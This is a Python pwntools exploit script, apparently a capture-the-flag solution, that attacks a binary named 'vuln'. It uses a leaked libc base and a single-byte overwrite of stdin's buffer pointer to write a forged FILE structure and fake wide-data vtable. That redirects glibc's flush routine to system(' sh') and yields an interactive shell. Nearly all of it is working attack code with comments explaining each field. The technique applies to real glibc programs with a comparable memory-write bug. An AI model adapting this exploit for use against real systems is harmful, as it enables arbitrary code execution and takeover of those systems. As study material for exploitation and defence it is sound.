# alternative solution gaining code execution with a vtable attack.
# this would work even if we just had libc leaks and no other leak.
from pwn import *

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("vuln")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
else:
	p = elf.process()

if args.GDB:
	gdb.attach(p, gdbscript="")
	pause()

# receiving the leaks
proc_maps = p.recvuntil(b"Here is an extra: ", drop = True).strip()
proc_maps = proc_maps.splitlines()

# parsing /proc/<pid>/maps content to find libc base
for line in proc_maps:
	if b"libc.so.6" in line:
		libc.address = int(line.split(b"-")[0], 16)
		break
log.success("libc @ " + hex(libc.address))

stdin = libc.sym["_IO_2_1_stdin_"]

# writing into the second least significant byte of stdin->_IO_buf_base
p.sendlineafter(b"Where: ", str(stdin + 0x38 + 1).encode())

# The byte that we want to write.
# (By looking at libc offsets we can see that writing this
# will move _IO_buf_base before the beginning of stdin FILE struct)
write_byte = (stdin >> 8) & 0xff

# Where _IO_buf_base will point to after our overwrite.
# (i.e. where payload1 will be written to).
# (stdin + 0x83) is the address of stdin->_short_buf, which is the
# initial value of stdin->_IO_buf_base.
write_begin = ((stdin + 0x83) & 0xffffffffffff00ff) | (write_byte << 8)

# The length of payload1
payload1_expected_length = 0x48 + (stdin - write_begin)

payload1 = b"\0" * (stdin - write_begin)	# padding until we reach the beginning of stdin FILE struct
payload1 += p64(0xfbad2088)	# _flags => just keeping them the same as what they are
payload1 += p64(stdin)	# _IO_read_ptr => Needs to point to some readable location (because _IO_file_underflow will dereference it and return the byte there).
# _IO_read_end will be increased by payload1_expected_length after the read() syscall, and
# we want it to point to somewhere before or equal to _IO_read_ptr after we are done, so that
# getchar() will call the read() syscall again next time.
payload1 += p64(stdin - payload1_expected_length)	# _IO_read_end
payload1 += p64(stdin) * 4	# Setting other pointers to the same value just in case.
payload1 += p64(stdin)	# _IO_buf_base => start of our arbitrary write buffer in the next getchar() call
payload1 += p64(stdin + 0x1000)	# _IO_buf_end => Somewhere far after _IO_buf_base so we have enough space to write
assert(len(payload1) == payload1_expected_length)

p.sendafter(b"What: ", bytes([write_byte]) + payload1)

# In the _flags field, only _IO_UNBUFFERED and _IO_NO_WRITES
# have to be 0 to trigger _IO_wdoallocbuf() in _IO_wfile_overflow().
# As the address of the file struct is passed as the first argument (in rdi)
# to whatever function will be called from the vtable (even our fake vtable)
# we can replace the vtable entry with system() and write something that gives us
# a shell in the _flags field. "sh" and "/bin/sh" both will cause one of _IO_UNBUFFERED
# or _IO_NO_WRITES to be 1, so I used a space in the beginning instead (" sh").
payload2 = b" sh".ljust(8, b"\0")	# _flags

payload2 += p64(stdin)	# _IO_read_ptr must be readable because it is dereferenced at the end of _IO_file_underflow
payload2 += p64(0) * 3
payload2 += p64(1)	# _IO_write_ptr must be bigger than _IO_write_base to trigger _IO_OVERFLOW() call in _IO_flush_all()
payload2 += p64(0) * 11
payload2 += p64(stdin + 0x68)	# _lock => point it to somewhere writable with value NULL
payload2 += p64(0) * 2
# offset 0x18 and 0x30 of _wide_data struct must be 0 to reach the code path that
# calls _IO_OVERFLOW() in _IO_wfile_overflow(), and offset 0xe0 of it will be _wide_vtable
payload2 += p64(stdin)	# _wide_data
payload2 = payload2.ljust(0xd0, b"\0")
payload2 += p64(libc.sym["system"])	# We will overwrite _wide_data->_wide_vtable in a way that its __doallocbuf entry points here
payload2 += p64(libc.sym["_IO_wfile_jumps"])	# vtable => its offset 0x18 will be called by _IO_flush_all() and we want to execute _IO_wfile_overflow() instead of that.
payload2 += p64(stdin + 0xd0 - 0x68)	# _wide_data->_wide_vtable

p.sendafter(b"exit)", payload2)

p.interactive()
